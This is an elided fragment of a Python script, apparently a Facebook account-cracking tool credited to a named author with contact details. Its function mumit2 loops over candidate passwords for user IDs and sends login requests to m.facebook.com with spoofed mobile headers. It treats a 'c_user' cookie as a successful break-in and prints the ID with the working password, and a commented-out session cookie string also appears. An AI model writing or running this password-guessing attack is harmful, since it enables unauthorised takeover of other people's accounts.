...
#CREATE BY : RAYHAN AHMED

#WHATSAPP : +8801300558774

#GITHUB : https://github.com/RS-RAYHAN
...
def fuck():
    ...
    print('[+] EXAMPLE CODE: 017, 018, 013, 019, 016')
...
def mumit2(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            header_fb = {'authority': 'm.facebook.com',
                'method':'GET',
            ...
            # 'cookie': 'datr=uL-eZFmjPC5AcJuroEeQk2zK; sb=uL-eZNBmlMpFpDgIGwtCq4HE; m_pixel_ratio=2; wd=360x660; fr=07YkfZT7U5FvaMlLu..Bknr-4.6B.AAA.0.0.Bknr-9.AWXhq-ejbwo',
                ...
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"Infinix X6511E"',
            ...
            if 'c_user' in log_cookies:
                ...
                #print(f"\033[1;94m[RAYHAN-CP] {cid}|{ps}")
